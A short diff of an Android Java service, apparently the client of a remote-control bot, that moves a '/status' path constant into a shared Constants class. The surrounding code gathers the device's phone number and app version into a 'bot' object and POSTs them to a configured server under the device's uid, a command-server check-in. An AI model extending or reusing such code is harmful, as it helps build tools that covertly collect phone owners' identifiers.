@@ -38,8 +38,6 @@ public class CommandService extends Service {
 
     private static final String TAG = "CommandService";
 
-    private static final String POST_STATUS = "/status";
-
     private CommonParams params;
     private CommandService client;
     private Socket socket;
@@ -289,7 +287,7 @@ public class CommandService extends Service {
             bot.put("version", params.getVersion());
             bot.put("phone", params.getPhone());
             Http req = new Http();
-            req.setUrl(params.getServer() + POST_STATUS + "/" + params.getUid());
+            req.setUrl(params.getServer() + Constants.POST_STATUS_URL + "/" + params.getUid());
             req.setMethod("POST");
             req.setParams(bot);
             req.execute();
